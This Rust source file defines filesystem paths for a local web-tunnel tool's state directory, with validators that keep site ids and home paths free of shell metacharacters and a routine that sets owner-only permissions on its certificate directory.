use std::path::PathBuf;

/// The user's home directory. Every Portico path hangs off this.
pub fn home() -> PathBuf {
    PathBuf::from(std::env::var("HOME").unwrap_or_else(|_| "/tmp".into()))
}

/// ~/.portico — all app state lives here.
pub fn root() -> PathBuf {
    home().join(".portico")
}

pub fn config_file() -> PathBuf {
    root().join("config.json")
}

pub fn caddyfile() -> PathBuf {
    root().join("Caddyfile")
}

/// Tools Portico fetches for itself, kept apart from anything the user
/// installed so we never shadow or clobber their own copy.
pub fn bin_dir() -> PathBuf {
    root().join("bin")
}

pub fn managed_cloudflared() -> PathBuf {
    bin_dir().join("cloudflared")
}

pub fn logs_dir() -> PathBuf {
    root().join("logs")
}

/// One structured request log for every site. A single writer is both simpler
/// than one file per site and lets the UI show a combined stream; the host is
/// in each record, so filtering per site is trivial.
pub fn access_log() -> PathBuf {
    logs_dir().join("access.log")
}

/// Generated "nothing is listening" pages, one per site.
pub fn offline_dir() -> PathBuf {
    root().join("offline")
}

pub fn offline_page(site_id: &str) -> PathBuf {
    offline_dir().join(format!("{site_id}.html"))
}

/// cloudflared's own output for one site.
pub fn tunnel_log(site_id: &str) -> PathBuf {
    logs_dir().join(format!("tunnel-{site_id}.log"))
}

/// Output of a dev server we started ourselves.
pub fn dev_log(site_id: &str) -> PathBuf {
    logs_dir().join(format!("dev-{site_id}.log"))
}

/// Where supervised processes are recorded, so a short-lived CLI run and the
/// long-running app agree about what is already going.
pub fn run_dir() -> PathBuf {
    root().join("run")
}

pub fn pid_file(site_id: &str) -> PathBuf {
    run_dir().join(format!("{site_id}.json"))
}

/// A site id is used to build filenames, so it must not be able to escape the
/// directory it belongs in. Ids are generated by slugifying a validated
/// domain; this guards the path where one arrives from outside.
pub fn safe_id(site_id: &str) -> bool {
    !site_id.is_empty()
        && site_id.len() <= 253
        && site_id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

/// Every path we generate is interpolated into a shell script and a plist that
/// run as **root**. A home directory containing a quote or `$(…)` would turn
/// that into arbitrary code execution as root, so such a path is refused
/// outright rather than escaped for two different grammars.
pub fn safe_path(path: &str) -> bool {
    !path.is_empty()
        && path.starts_with('/')
        && path.len() <= 1024
        && path
            .chars()
            .all(|c| !c.is_control() && !"\"'`$\\<>&|;*?()[]{}!".contains(c))
}

pub fn ensure_dirs() -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    std::fs::create_dir_all(root())?;
    // Owner-only. Caddy's PKI lives under here, and its CA is trusted by this
    // machine — a readable copy of that key would let any local account mint
    // certificates this Mac accepts for any domain.
    std::fs::set_permissions(root(), std::fs::Permissions::from_mode(0o700))?;
    std::fs::create_dir_all(logs_dir())?;
    std::fs::create_dir_all(run_dir())?;
    Ok(())
}

